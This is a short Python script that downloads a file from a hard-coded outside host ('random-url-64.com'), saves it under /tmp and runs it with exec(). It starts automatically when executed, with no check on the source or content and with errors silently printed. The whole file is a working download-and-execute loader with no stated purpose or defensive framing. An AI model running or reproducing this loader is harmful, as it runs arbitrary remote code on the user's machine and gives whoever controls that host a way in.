import requests
import os

def fetch_script(url):
    response = requests.get(url)
    return response.text

def save_script(filepath, script):
    with open(filepath, "w") as f:
        f.write(script)

def load_script(filepath):
    with open(filepath, "r") as f:
        return f.read()

def execute_script(script):
    try:
        exec(script)
    except Exception as e:
        print(e)

def main():
    random_url = "http://random-url-64.com/script.py"
    local_file = "/tmp/script64.py"

    fetched_script = fetch_script(random_url)
    save_script(local_file, fetched_script)

    script_to_execute = load_script(local_file)
    execute_script(script_to_execute)

main()
